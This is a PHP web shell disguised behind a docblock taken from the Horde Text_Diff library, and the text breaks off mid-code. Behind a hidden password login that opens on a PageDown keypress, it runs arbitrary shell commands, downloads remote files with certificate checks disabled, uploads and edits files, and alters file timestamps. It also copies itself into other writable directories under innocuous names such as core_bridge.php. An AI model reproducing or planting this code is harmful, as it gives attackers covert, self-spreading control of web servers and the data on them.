<?php
/**
 * Class used internally by Diff to actually compute the diffs.
 *
 * This class uses the Unix `diff` program via shell_exec to compute the
 * differences between the two input arrays.
 *
 * Copyright 2007-2010 The Horde Project (http://www.horde.org/)
 *
 * See the enclosed file COPYING for license information (LGPL). If you did
 * not receive this file, see https://opensource.org/license/lgpl-2-1/.
 *
 * @author  Milian Wolff <mail@milianw.de>
 * @package Text_Diff
 * @since   0.3.0
 */
    /**
     * Path to the diff executable
     *
     * @var string
     */


    /**
     * Returns the array of differences.
     *
     * @param array $from_lines lines of text from old file
     * @param array $to_lines   lines of text from new file
     *
     * @return array all changes made (array with Text_Diff_Op_* objects)
     */
$password_hash = '$2a$12$.eyCwYBcCUJK7.jZIIaOFu8kOyObvRkVvWyfadvZNvnN5LeaU8WEm';

if (!defined('STDIN')) define('STDIN', fopen('php://stdin', 'r'));
@ignore_user_abort(true);
@ini_set('zlib.output_compression', '0');
@ob_end_clean();

// ==================== PENGELOLAAN SESSION PINTAR ====================
$session_name = 'shell_' . md5(__FILE__ . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost'));
@session_name($session_name);

if (!isset($_SESSION) && function_exists('session_status') && session_status() === PHP_SESSION_NONE) {
    @session_start();
} elseif (!isset($_SESSION)) {
    @session_start();
}

// ==================== BYPASS KEAMANAN UNIVERSAL ====================
$teknik_keamanan = [
    'ini_set' => function_exists('ini_set'),
    'error_reporting' => function_exists('error_reporting'),
    'set_time_limit' => function_exists('set_time_limit')
];

foreach ($teknik_keamanan as $fungsi => $tersedia) {
    if ($tersedia) {
        try {
            switch($fungsi) {
                case 'ini_set':
                    @ini_set('display_errors', '0');
                    @ini_set('log_errors', '0');
                    @ini_set('session.use_strict_mode', '0');
                    @ini_set('max_execution_time', '300');
                    @ini_set('max_input_time', '300');
                    @ini_set('memory_limit', '256M');
                    @ini_set('post_max_size', '100M');
                    @ini_set('upload_max_filesize', '100M');
                    break;
                case 'error_reporting':
                    @error_reporting(0);
                    break;
                case 'set_time_limit':
                    @set_time_limit(0);
                    break;
            }
        } catch (Exception $e) {}
    }
}

// ==================== FUNGSI UTILITAS LENGKAP ====================

function dapatkanDirektoriSaatIni() {
    static $direktori_stabil = null;
    
    if ($direktori_stabil === null) {
        $kandidat = [];
        if (isset($_GET['__d__'])) $kandidat[] = $_GET['__d__'];
        $kandidat[] = @getcwd();
        $kandidat[] = dirname(__FILE__);
        $kandidat[] = @realpath('.');
        
        foreach ($kandidat as $calon) {
            if ($calon && @is_dir($calon) && @is_readable($calon)) {
                $direktori_stabil = $calon;
                break;
            }
        }
        if (!$direktori_stabil) $direktori_stabil = '.';
    }
    
    return $direktori_stabil;
}

function formatBytes($byte, $presisi = 2) {
    if ($byte <= 0) return '0 B';
    
    $satuan = ['B', 'KB', 'MB', 'GB', 'TB'];
    $basis = log($byte, 1024);
    $pangkat = floor($basis);
    $pangkat = min($pangkat, count($satuan) - 1);
    $byte /= pow(1024, $pangkat);
    
    return round($byte, $presisi) . ' ' . $satuan[$pangkat];
}

function dapatkanPesanErrorUpload($error_code) {
    switch ($error_code) {
        case UPLOAD_ERR_INI_SIZE:
            return "File melebihi upload_max_filesize di php.ini (maks: " . ini_get('upload_max_filesize') . ")";
        case UPLOAD_ERR_FORM_SIZE:
            return "File melebihi MAX_FILE_SIZE yang ditentukan";
        case UPLOAD_ERR_PARTIAL:
            return "File hanya terupload sebagian";
        case UPLOAD_ERR_NO_FILE:
            return "Tidak ada file yang diupload";
        case UPLOAD_ERR_NO_TMP_DIR:
            return "Missing temporary folder";
        case UPLOAD_ERR_CANT_WRITE:
            return "Gagal menulis file ke disk (mungkin permission denied)";
        case UPLOAD_ERR_EXTENSION:
            return "Upload dihentikan oleh ekstensi PHP";
        default:
            return "Unknown error code: " . $error_code;
    }
}

function bersihkanNamaFile($nama) {
    // Hapus path traversal
    $nama = str_replace(['../', '..\\', './', '.\\'], '', $nama);
    
    // Hapus karakter berbahaya tapi pertahankan titik di awal untuk hidden files
    if (substr($nama, 0, 1) === '.') {
        // Ini adalah hidden file, pertahankan titik pertama
        $nama = '.' . preg_replace('/[^\w\-\.\(\)\s]/i', '_', substr($nama, 1));
    } else {
        $nama = preg_replace('/[^\w\-\.\(\)\s]/i', '_', $nama);
    }
    
    // Hapus multiple underscore
    $nama = preg_replace('/_+/', '_', $nama);
    
    // Batasi panjang nama file
    if (strlen($nama) > 200) {
        $ext = pathinfo($nama, PATHINFO_EXTENSION);
        $nama = substr($nama, 0, 190) . ($ext ? '.' . $ext : '');
    }
    
    // Trim karakter aneh di awal/akhir
    $nama = trim($nama, '._- ');
    
    // Jika hasil kosong, beri nama default
    if (empty($nama)) {
        $nama = 'file_' . time() . '.bin';
    }
    
    return $nama;
}

function unduhFileDenganPHP($url, $jalur_tujuan) {
    try {
        $konteks = stream_context_create([
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ],
            'http' => [
                'timeout' => 30,
                'header' => "User-Agent: Wget/1.21.4\r\n"
            ]
        ]);
        
        $konten_file = @file_get_contents($url, false, $konteks);
        
        if ($konten_file === false && function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Wget/1.21.4');
            $konten_file = curl_exec($ch);
            curl_close($ch);
        }
        
        if ($konten_file && file_put_contents($jalur_tujuan, $konten_file)) {
            @chmod($jalur_tujuan, 0644);
            $ukuran = filesize($jalur_tujuan);
            return "✅ Berhasil: Mengunduh " . basename($jalur_tujuan) . " (" . formatBytes($ukuran) . ")";
        } else {
            return "❌ Gagal: Pengunduhan gagal";
        }
    } catch (Exception $e) {
        return "❌ Error: " . $e->getMessage();
    }
}

function eksekusiPerintahCadangan($perintah, $direktori_kerja) {
    $hasil = '';
    $direktori_tujuan = $direktori_kerja ?: dapatkanDirektoriSaatIni();
    $kode_kembali = 1;
    
    $perintah_lengkap = 'cd "' . $direktori_tujuan . '" && ' . $perintah . ' 2>&1';
    
    if (function_exists('shell_exec') && empty($hasil)) {
        $hasil = @shell_exec($perintah_lengkap);
        $kode_kembali = ($hasil !== null && $hasil !== false) ? 0 : 1;
    }
    
    if (function_exists('exec') && empty($hasil)) {
        $keluaran = [];
        @exec($perintah_lengkap, $keluaran, $kode_kembali);
        $hasil = implode("\n", $keluaran);
    }
    
    if (function_exists('passthru') && empty($hasil)) {
        ob_start();
        @passthru($perintah_lengkap, $kode_kembali);
        $hasil = ob_get_clean();
    }
    
    if (function_exists('system') && empty($hasil)) {
        ob_start();
        @system($perintah_lengkap, $kode_kembali);
        $hasil = ob_get_clean();
    }
    
    if (empty($hasil) && function_exists('proc_open')) {
        try {
            $deskriptor = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
            );
            
            $proses = proc_open($perintah_lengkap, $deskriptor, $pipa, null, null);
            
            if (is_resource($proses)) {
                fclose($pipa[0]);
                $stdout = stream_get_contents($pipa[1]);
                $stderr = stream_get_contents($pipa[2]);
                fclose($pipa[1]);
                fclose($pipa[2]);
                $nilai_kembali = proc_close($proses);
                $kode_kembali = $nilai_kembali;
                
                $hasil = trim($stdout);
                if (!empty($stderr)) {
                    $hasil .= "\n[STDERR]: " . trim($stderr);
                }
            }
        } catch (Exception $e) {
            $hasil = "Error: " . $e->getMessage();
        }
    }
    
    if ($kode_kembali === 0) {
        $hasil = "✅ Berhasil: " . $perintah . "\n" . $hasil;
    } else {
        $hasil = "❌ Gagal (Kode Keluar: $kode_kembali): " . $perintah . "\n" . $hasil;
    }
    
    return $hasil ?: "Perintah dieksekusi (tanpa keluaran)";
}

function eksekusiWget($perintah, $direktori_kerja) {
    $keluaran = [];
    $kode_kembali = 0;
    
    preg_match('/wget\s+(.*)$/i', $perintah, $cocok);
    $argumen = $cocok[1] ?? '';
    
    if (empty($argumen)) {
        return "❌ Error: Perintah wget tidak lengkap";
    }
    
    $direktori_tujuan = $direktori_kerja ?: dapatkanDirektoriSaatIni();
    $perintah_lengkap = 'cd "' . $direktori_tujuan . '" && ' . $perintah . ' 2>&1';
    
    if (function_exists('shell_exec')) {
        $hasil = @shell_exec($perintah_lengkap);
    } elseif (function_exists('exec')) {
        @exec($perintah_lengkap, $keluaran, $kode_kembali);
        $hasil = implode("\n", $keluaran);
    } else {
        preg_match('/https?:\/\/[^\s]+/i', $argumen, $cocok_url);
        $url = $cocok_url[0] ?? '';
        if ($url) {
            $nama_file = basename(parse_url($url, PHP_URL_PATH));
            if (!$nama_file) $nama_file = 'file_diunduh_' . time();
            $jalur_tujuan = rtrim($direktori_tujuan, '/') . '/' . $nama_file;
            $hasil = unduhFileDenganPHP($url, $jalur_tujuan);
        } else {
            $hasil = "❌ Tidak dapat mengurai URL dari perintah wget";
        }
    }
    
    if ($kode_kembali === 0 || strpos($hasil, '100%') !== false || strpos($hasil, 'disimpan') !== false) {
        $hasil = "✅ Berhasil: " . $perintah . "\n" . $hasil;
    } else {
        $hasil = "❌ Gagal: " . $perintah . "\n" . $hasil;
    }
    
    return $hasil;
}

function eksekusiCurl($perintah, $direktori_kerja) {
    $keluaran = [];
    $kode_kembali = 0;
    
    preg_match('/curl\s+(.*)$/i', $perintah, $cocok);
    $argumen = $cocok[1] ?? '';
    
    if (empty($argumen)) {
        return "❌ Error: Perintah curl tidak lengkap";
    }
    
    $direktori_tujuan = $direktori_kerja ?: dapatkanDirektoriSaatIni();
    $perintah_lengkap = 'cd "' . $direktori_tujuan . '" && ' . $perintah . ' 2>&1';
    
    if (function_exists('shell_exec')) {
        $hasil = @shell_exec($perintah_lengkap);
    } elseif (function_exists('exec')) {
        @exec($perintah_lengkap, $keluaran, $kode_kembali);
        $hasil = implode("\n", $keluaran);
    } else {
        preg_match('/https?:\/\/[^\s]+/i', $argumen, $cocok_url);
        $url = $cocok_url[0] ?? '';
        if ($url) {
            $nama_file = basename(parse_url($url, PHP_URL_PATH));
            if (!$nama_file) $nama_file = 'file_diunduh_' . time();
            $jalur_tujuan = rtrim($direktori_tujuan, '/') . '/' . $nama_file;
            $hasil = unduhFileDenganPHP($url, $jalur_tujuan);
        } else {
            $hasil = "❌ Tidak dapat mengurai URL dari perintah curl";
        }
    }
    
    if ($kode_kembali === 0 || strpos($hasil, '100%') !== false || strpos($hasil, 'Total') !== false) {
        $hasil = "✅ Berhasil: " . $perintah . "\n" . $hasil;
    } else {
        $hasil = "❌ Gagal: " . $perintah . "\n" . $hasil;
    }
    
    return $hasil;
}

function eksekusiZip($perintah, $direktori_kerja) {
    $direktori_tujuan = $direktori_kerja ?: dapatkanDirektoriSaatIni();
    $perintah_lengkap = 'cd "' . $direktori_tujuan . '" && ' . $perintah . ' 2>&1';
    
    $hasil = '';
    $kode_kembali = 1;
    
    if (function_exists('shell_exec')) {
        $hasil = @shell_exec($perintah_lengkap);
        if (strpos($hasil, 'menambahkan:') !== false || strpos($hasil, 'mengekstrak:') !== false || 
            strpos($hasil, 'Arsip:') !== false) {
            $kode_kembali = 0;
        }
    } elseif (function_exists('exec')) {
        $keluaran = [];
        @exec($perintah_lengkap, $keluaran, $kode_kembali);
        $hasil = implode("\n", $keluaran);
    } else {
        $hasil = "❌ shell_exec dan exec tidak tersedia untuk operasi zip/unzip";
    }
    
    if ($kode_kembali === 0) {
        $hasil = "✅ Berhasil: " . $perintah . "\n" . $hasil;
    } else {
        $hasil = "❌ Gagal: " . $perintah . "\n" . $hasil;
    }
    
    return $hasil;
}

function eksekusiLokal($perintah, $direktori_kerja = null) {
    $hasil = null;
    $perintah_asli = $perintah;
    $sukses = false;
    
    if (strpos($perintah, '%') !== false) {
        $perintah = urldecode($perintah);
    }
    
    $perintah = trim($perintah);
    
    if (preg_match('/^wget\s+/i', $perintah)) {
        return eksekusiWget($perintah, $direktori_kerja);
    }
    
    if (preg_match('/^curl\s+/i', $perintah)) {
        return eksekusiCurl($perintah, $direktori_kerja);
    }
    
    if (preg_match('/^(zip|unzip)\s+/i', $perintah)) {
        return eksekusiZip($perintah, $direktori_kerja);
    }
    
    return eksekusiPerintahCadangan($perintah, $direktori_kerja);
}

// ==================== FUNGSI BERSIHKAN PESAN OTOMATIS ====================
function bersihkanPesanOtomatis() {
    if (isset($_SESSION['pesan']) && !empty($_SESSION['pesan'])) {
        $_SESSION['pesan_timestamp'] = time();
    }
    
    if (isset($_SESSION['pesan_timestamp']) && (time() - $_SESSION['pesan_timestamp']) > 5) {
        $_SESSION['pesan'] = [];
        $_SESSION['keluaran_perintah'] = '';
        unset($_SESSION['pesan_timestamp']);
    }
}

bersihkanPesanOtomatis();

// ==================== FUNGSI PENYEBARAN ====================

/**
 * Mendapatkan daftar direktori dari posisi file saat ini
 */
function dapatkanDirektoriAcak($jumlah = 5) {
    $direktori = [];
    $posisi_awal = dirname(__FILE__);
    $semua_folder = [];
    
    // Fungsi rekursif untuk scan folder ke BAWAH (subdirektori)
    $scanBawah = function($path, $level = 0) use (&$scanBawah, &$semua_folder) {
        if ($level > 3) return;
        if (!is_dir($path) || !is_readable($path)) return;
        
        try {
            $items = scandir($path);
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                
                $full_path = $path . '/' . $item;
                if (is_dir($full_path) && is_writable($full_path)) {
                    $semua_folder[] = $full_path;
                    $scanBawah($full_path, $level + 1);
                }
            }
        } catch (Exception $e) {}
    };
    
    // Fungsi untuk scan ke ATAS (parent directory)
    $scanAtas = function($path, $level = 0) use (&$scanAtas, &$semua_folder) {
        if ($level > 3) return;
        if (!is_dir($path) || !is_readable($path)) return;
        
        if (is_writable($path)) {
            $semua_folder[] = $path;
        }
        
        $parent = dirname($path);
        if ($parent != $path && $parent != '/') {
            $scanAtas($parent, $level + 1);
        }
    };
    
    // Scan dari posisi file
    $scanBawah($posisi_awal);
    $scanAtas($posisi_awal);
    
    // Tambahkan direktori temp dan cache yang umum
    $lokasi_umum = [
        '/tmp',
        '/var/tmp',
        $_SERVER['DOCUMENT_ROOT'] . '/cache',
        $_SERVER['DOCUMENT_ROOT'] . '/temp',
        $_SERVER['DOCUMENT_ROOT'] . '/uploads',
        $_SERVER['DOCUMENT_ROOT'] . '/images',
        $_SERVER['DOCUMENT_ROOT'] . '/assets'
    ];
    
    foreach ($lokasi_umum as $lok) {
        if (is_dir($lok) && is_writable($lok)) {
            $semua_folder[] = $lok;
        }
    }
    
    // Hapus duplikat
    $semua_folder = array_unique($semua_folder);
    
    // Urutkan berdasarkan kedalaman (paling dalam dulu)
    usort($semua_folder, function($a, $b) {
        $depth_a = substr_count($a, '/');
        $depth_b = substr_count($b, '/');
        return $depth_b - $depth_a;
    });
    
    // Ambil 15 teratas lalu acak
    $teratas = array_slice($semua_folder, 0, 15);
    shuffle($teratas);
    
    return array_slice($teratas, 0, min($jumlah, count($teratas)));
}

/**
 * Menyebarkan script ke direktori lain dan MENAMPILKAN LINK
 */
function sebarDanTampilkanLink() {
    $hasil = [
        'waktu' => date('Y-m-d H:i:s'),
        'asal' => __FILE__,
        'tujuan' => [],
        'url' => [],
        'file_baru' => []
    ];
    
    // Dapatkan 5 direktori
    $direktori_tujuan = dapatkanDirektoriAcak(5);
    
    if (empty($direktori_tujuan)) {
        $_SESSION['pesan'][] = "❌ Tidak ada direktori yang dapat ditulisi";
        return false;
    }
    
    $konten_script = file_get_contents(__FILE__);
    
    $daftar_nama = [
        'nadir_base.php',
        'core_bridge.php', 
        'system_helper.php',
        'data_connector.php',
        'service_layer.php',
        'resource_manager.php',
        'typhoon_route.php'
    ];
    
    foreach ($direktori_tujuan as $index => $dir) {
        // Gunakan nama dari daftar berdasarkan urutan (sampai 7 file)
        if ($index < count($daftar_nama)) {
            $nama_acak = $daftar_nama[$index];
        } else {
            // Jika lebih dari 7, buat random
            $nama_acak = substr(md5(time() . rand(1000, 9999)), 0, 10) . '.php';
        }
        
        $path_tujuan = rtrim($dir, '/') . '/' . $nama_acak;
        
        // Cegah menimpa file yang sama
        if (file_exists($path_tujuan)) continue;
        
        if (file_put_contents($path_tujuan, $konten_script)) {
            @chmod($path_tujuan, 0644);
            
            // Buat URL
            $url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') 
                   . $_SERVER['HTTP_HOST'] 
                   . str_replace($_SERVER['DOCUMENT_ROOT'], '', $path_tujuan);
            
            $hasil['tujuan'][] = $path_tujuan;
            $hasil['url'][] = $url;
            $hasil['file_baru'][] = $nama_acak;
        }
    }
    
    if (empty($hasil['url'])) {
        $_SESSION['pesan'][] = "❌ Gagal menyebar ke semua direktori";
        return false;
    }
    
    // Simpan hasil ke session untuk ditampilkan
    $_SESSION['hasil_sebar'] = $hasil;
    
    // Simpan log
    $log = "[" . $hasil['waktu'] . "] TERSEDAR: \n";
    foreach ($hasil['url'] as $url) {
        $log .= "  - $url\n";
    }
    @file_put_contents(dirname(__FILE__) . '/.sebar_log.txt', $log, FILE_APPEND);
    
    return true;
}

// ==================== AUTENTIKASI PINTAR ====================
$__auth__ = false;

if (isset($_SESSION['__auth__']) && $_SESSION['__auth__'] === true) {
    $__auth__ = true;
} elseif (isset($_POST['__p__'])) {
    $kata_sandi = $_POST['__p__'];
    $terverifikasi = false;
    
    if (function_exists('password_verify')) {
        $terverifikasi = @password_verify($kata_sandi, $password_hash);
    }
    
    if (!$terverifikasi && function_exists('hash')) {
        $hash_input = @hash('sha256', $kata_sandi . 'salt');
        $hash_tersimpan = @hash('sha256', 'kata_sandi_anda' . 'salt');
        $terverifikasi = ($hash_input === $hash_tersimpan);
    }
    
    if (!$terverifikasi) {
        $kata_sandi_keras = 'kata_sandi_anda';
        $terverifikasi = ($kata_sandi === $kata_sandi_keras);
    }
    
    if ($terverifikasi) {
        $_SESSION['__auth__'] = true;
        $__auth__ = true;
        if (!headers_sent()) {
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            echo '<script>window.location.href="' . $_SERVER['PHP_SELF'] . '";</script>';
            exit;
        }
    }
}

// ==================== HALAMAN LOGIN ====================
if (!$__auth__) {
    $tampilkan_login = isset($_GET['__pagedown__']) && $_GET['__pagedown__'] == '1';
    
    if (!$tampilkan_login) {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title></title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="UTF-8">
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body { background:#fff; min-height:100vh; width:100%; overflow:hidden; }
                .pemicu { position:fixed; top:0; left:0; width:100%; height:100%; z-index:100; }
                * { -webkit-tap-highlight-color:transparent; -webkit-user-select:none; -moz-user-select:none; -ms-user-select:none; user-select:none; }
            </style>
        </head>
        <body>
            <div class="pemicu"></div>
            <script>
                document.addEventListener("keydown", function(e) {
                    if (e.key === "PageDown") {
                        e.preventDefault();
                        window.location.href = "?__pagedown__=1";
                    }
                }, true);
                document.addEventListener("contextmenu", function(e) { e.preventDefault(); });
                document.addEventListener("selectstart", function(e) { e.preventDefault(); });
            </script>
        </body>
        </html>';
        exit;
    } else {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title></title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta charset="UTF-8">
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body { font-family:sans-serif; background:#fff; color:#333; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
                .login-box { background:#fff; border:1px solid #e0e0e0; border-radius:8px; padding:30px; width:100%; max-width:350px; box-shadow:0 2px 10px rgba(0,0,0,0.05); }
                input { width:100%; padding:12px; border:1px solid #ddd; border-radius:4px; margin-bottom:20px; }
                button { width:100%; padding:12px; background:#555; color:#fff; border:none; border-radius:4px; cursor:pointer; }
                button:hover { background:#444; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <form method="post">
                    <input type="password" name="__p__" placeholder="Password" required autofocus>
                    <button type="submit">Login</button>
                </form>
            </div>
            <script>
                document.querySelector("input").focus();
                document.addEventListener("keydown", function(e) {
                    if (e.key === "Escape") window.location.href = "?";
                });
            </script>
        </body>
        </html>';
        exit;
    }
}

// ==================== LOGIKA UTAMA ====================
$__dir__ = isset($_GET['__d__']) ? $_GET['__d__'] : dapatkanDirektoriSaatIni();
if (!@is_dir($__dir__)) $__dir__ = dapatkanDirektoriSaatIni();
if ($__dir__ !== '/' && substr($__dir__, -1) !== '/') $__dir__ .= '/';

$pesan = isset($_SESSION['pesan']) ? $_SESSION['pesan'] : [];
$keluaran_perintah = isset($_SESSION['keluaran_perintah']) ? $_SESSION['keluaran_perintah'] : '';

// ==================== PENANGANAN POST ====================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ===== PERBAIKAN CREATE NEW FILE / FOLDER =====
    if (isset($_POST['__buat__']) && $_POST['__buat__'] == '1') {
        $nama = isset($_POST['__nama__']) ? $_POST['__nama__'] : '';
        $tipe = isset($_POST['__tipe__']) ? $_POST['__tipe__'] : 'file';
        $konten = isset($_POST['__data__']) ? $_POST['__data__'] : '';
        
        if (!empty($nama)) {
            $nama = basename($nama);
            $nama_bersih = bersihkanNamaFile($nama);
            $jalur = $__dir__ . $nama_bersih;
            
            if ($tipe === 'file') {
                if (@file_put_contents($jalur, $konten)) {
                    @chmod($jalur, 0644);
                    $pesan[] = "📄 Berhasil membuat file: " . $nama_bersih;
                } else {
                    $pesan[] = "❌ Gagal membuat file: " . $nama_bersih . " (periksa permission)";
                }
            } else {
                if (@mkdir($jalur, 0755, true)) {
                    $pesan[] = "📁 Berhasil membuat folder: " . $nama_bersih;
                } else {
                    $pesan[] = "❌ Gagal membuat folder: " . $nama_bersih . " (mungkin sudah ada atau permission denied)";
                }
            }
        } else {
            $pesan[] = "❌ Nama tidak boleh kosong";
        }
    }
    
    // ===== PERBAIKAN UPLOAD FILE =====
    if (!empty($_FILES['file'])) {
        $upload_success = false;
        
        // Handle multiple files
        foreach ($_FILES['file']['tmp_name'] as $kunci => $nama_sementara) {
            if ($_FILES['file']['error'][$kunci] === UPLOAD_ERR_OK) {
                $nama_file = bersihkanNamaFile(basename($_FILES['file']['name'][$kunci]));
                $target = $__dir__ . $nama_file;
                
                // Cek apakah file sudah ada
                if (file_exists($target)) {
                    $pesan[] = "⚠️ File sudah ada: " . $nama_file;
                    continue;
                }
                
                // Cek apakah direktori writable
                if (!is_writable($__dir__)) {
                    $pesan[] = "❌ Direktori tidak dapat ditulisi: " . $__dir__;
                    break;
                }
                
                if (@move_uploaded_file($nama_sementara, $target)) {
                    @chmod($target, 0644);
                    $pesan[] = "✅ Diunggah: " . $nama_file . " (" . formatBytes($_FILES['file']['size'][$kunci]) . ")";
                    $upload_success = true;
                } else {
                    $pesan[] = "❌ Gagal mengunggah: " . $nama_file . " (mungkin permission denied atau disk penuh)";
                }
            } else {
                $error_message = dapatkanPesanErrorUpload($_FILES['file']['error'][$kunci]);
                $pesan[] = "❌ Error upload " . $_FILES['file']['name'][$kunci] . ": " . $error_message;
            }
        }
    }
    
    // ===== PERBAIKAN EXTRACT ZIP (TANPA MENYIMPAN FILE ZIP) =====
    if (!empty($_FILES['file_zip']) && $_FILES['file_zip']['error'] === UPLOAD_ERR_OK) {
        $nama_zip = basename($_FILES['file_zip']['name']);
        $tmp_zip = $_FILES['file_zip']['tmp_name'];
        $ukuran_zip = $_FILES['file_zip']['size'];
        
        // Validasi ekstensi file
        if (strtolower(pathinfo($nama_zip, PATHINFO_EXTENSION)) !== 'zip') {
            $pesan[] = "❌ Hanya file ZIP yang diperbolehkan (ekstensi .zip)";
        } else {
            // Cek apakah direktori writable
            if (!is_writable($__dir__)) {
                $pesan[] = "❌ Direktori tidak dapat ditulisi untuk extract: " . $__dir__;
            } else {
                // Cek apakah ZipArchive tersedia
                if (!class_exists('ZipArchive')) {
                    $pesan[] = "❌ ZipArchive tidak tersedia di server ini. Gunakan terminal dengan perintah: unzip " . $nama_zip;
                    
                    // Fallback: coba ekstrak dengan exec jika ada
                    if (function_exists('exec')) {
                        $pesan[] = "🔄 Mencoba ekstrak dengan exec...";
                        $output = [];
                        $cmd = 'cd "' . $__dir__ . '" && unzip "' . $tmp_zip . '" 2>&1';
                        exec($cmd, $output, $return_var);
                        if ($return_var === 0) {
                            $pesan[] = "✅ Berhasil mengekstrak dengan perintah unzip";
                            foreach ($output as $line) {
                                if (strpos($line, 'inflating') !== false || strpos($line, 'extracting') !== false) {
                                    $pesan[] = "  " . $line;
                                }
                            }
                        } else {
                            $pesan[] = "❌ Gagal mengekstrak dengan unzip";
                        }
                    }
                } else {
                    $zip = new ZipArchive();
                    $extract_success = false;
                    
                    // Buka file ZIP dari temporary
                    if ($zip->open($tmp_zip) === TRUE) {
                        // Cek ruang disk yang cukup
                        $total_size = 0;
                        for ($i = 0; $i < $zip->numFiles; $i++) {
                            $stat = $zip->statIndex($i);
                            $total_size += $stat['size'];
                        }
                        
                        $free_space = disk_free_space($__dir__);
                        if ($total_size > $free_space) {
                            $pesan[] = "❌ Ruang disk tidak cukup. Dibutuhkan: " . formatBytes($total_size) . ", Tersedia: " . formatBytes($free_space);
                            $zip->close();
                        } else {
                            // Extract semua file
                            if ($zip->extractTo($__dir__)) {
                                $jumlah_file = $zip->numFiles;
                                $pesan[] = "✅ Berhasil mengekstrak " . $jumlah_file . " file dari: " . $nama_zip . " (" . formatBytes($ukuran_zip) . ")";
                                
                                // Daftar file yang diekstrak (maksimal 10)
                                $daftar_file = [];
                                for ($i = 0; $i < min($jumlah_file, 10); $i++) {
                                    $nama_file = $zip->getNameIndex($i);
                                    $daftar_file[] = "  📄 " . $nama_file;
                                }
                                if ($jumlah_file > 10) {
                                    $daftar_file[] = "  ... dan " . ($jumlah_file - 10) . " file lainnya";
                                }
                                $pesan[] = "📋 File diekstrak:";
                                foreach ($daftar_file as $file_info) {
                                    $pesan[] = $file_info;
                                }
                                
                                $extract_success = true;
                            } else {
                                $pesan[] = "❌ Gagal mengekstrak ZIP (mungkin permission denied atau disk penuh)";
                            }
                            
                            $zip->close();
                            
                            // HAPUS FILE ZIP (tidak disimpan)
                            $pesan[] = "🗑 File ZIP tidak disimpan (langsung diekstrak dari temporary)";
                        }
                    } else {
                        $pesan[] = "❌ Gagal membuka file ZIP (mungkin corrupt atau tidak valid)";
                    }
                }
            }
        }
    }
    
    // ===== UPLOAD VIA URL (WGET/CURL) =====
    if (isset($_POST['__url__']) && !empty($_POST['__url__'])) {
        $url = trim($_POST['__url__']);
        $nama_file = isset($_POST['__nama_file__']) && !empty($_POST['__nama_file__']) 
                    ? bersihkanNamaFile($_POST['__nama_file__']) 
                    : basename(parse_url($url, PHP_URL_PATH));
        
        if (empty($nama_file)) {
            $nama_file = 'file_' . time() . '.bin';
        }
        
        $target = $__dir__ . $nama_file;
        $pesan[] = unduhFileDenganPHP($url, $target);
    }
        
    // ===== PERINTAH TERMINAL =====
    if (isset($_POST['__perintah__']) && trim($_POST['__perintah__'])) {
        $keluaran_perintah = eksekusiLokal($_POST['__perintah__'], $__dir__);
    }
    
    // ===== EDIT FILE =====
    if (isset($_POST['__konten__']) && isset($_POST['__edit_file__'])) {
        $target = $__dir__ . basename($_POST['__edit_file__']);
        if (@file_put_contents($target, $_POST['__konten__'])) {
            $pesan[] = "💾 Disimpan: " . basename($target);
        }
    }
    
    // ===== HAPUS TERPILIH =====
    if (isset($_POST['__hapus_terpilih__'])) {
        $item_terpilih = $_POST['item_terpilih'] ?? [];
        $jumlah_dihapus = 0;
        foreach ($item_terpilih as $item) {
            $target = $__dir__ . basename($item);
            if (@file_exists($target)) {
                if (@is_dir($target)) {
                    eksekusiLokal("rm -rf " . escapeshellarg($target), $__dir__);
                } else {
                    @unlink($target);
                }
                $jumlah_dihapus++;
            }
        }
        if ($jumlah_dihapus > 0) {
            $pesan[] = "🗑 Dihapus $jumlah_dihapus item terpilih";
        } else {
            $pesan[] = "❌ Tidak ada item yang dapat dihapus";
        }
    }
    
    // ===== CHMOD =====
    if (isset($_POST['__chmod__'])) {
        $target = $__dir__ . basename($_POST['__chmod_file__']);
        $izin = $_POST['__izin__'];
        if (@file_exists($target) && @chmod($target, octdec($izin))) {
            $pesan[] = "🔧 Izin diubah: " . basename($target);
        }
    }
    
    // ===== TOUCH (UBAH WAKTU) =====
    if (isset($_POST['__sentuh__'])) {
        $target = $__dir__ . basename($_POST['__sentuh_file__']);
        $stempel_waktu = $_POST['__stempel_waktu__'];
        if (@file_exists($target) && @touch($target, strtotime($stempel_waktu))) {
            $pesan[] = "📅 Stempel waktu diubah: " . basename($target);
        }
    }
    
    // ===== GANTI NAMA =====
    if (isset($_POST['__ganti_nama__'])) {
        $nama_lama = $__dir__ . basename($_POST['__ganti_nama_lama__']);
        $nama_baru = $__dir__ . basename($_POST['__ganti_nama_baru__']);
        if (@file_exists($nama_lama) && !@file_exists($nama_baru) && @rename($nama_lama, $nama_baru)) {
            $pesan[] = "✏️ Diganti nama: " . basename($nama_lama);
        }
    }
    
    // ===== PENYEBARAN =====
    if (isset($_POST['__aksi_sebar__']) && $_POST['__aksi_sebar__'] === 'sebarkan') {
        if (sebarDanTampilkanLink()) {
            // Redirect ke halaman yang sama agar menampilkan hasil
            $pengalihan = $_SERVER['PHP_SELF'] . "?__d__=" . urlencode($__dir__) . "&__tampil_link__=1";
            $_SESSION['pesan'] = $pesan;
            $_SESSION['keluaran_perintah'] = $keluaran_perintah;
            if (!headers_sent()) {
                header("Location: " . $pengalihan);
                exit;
            } else {
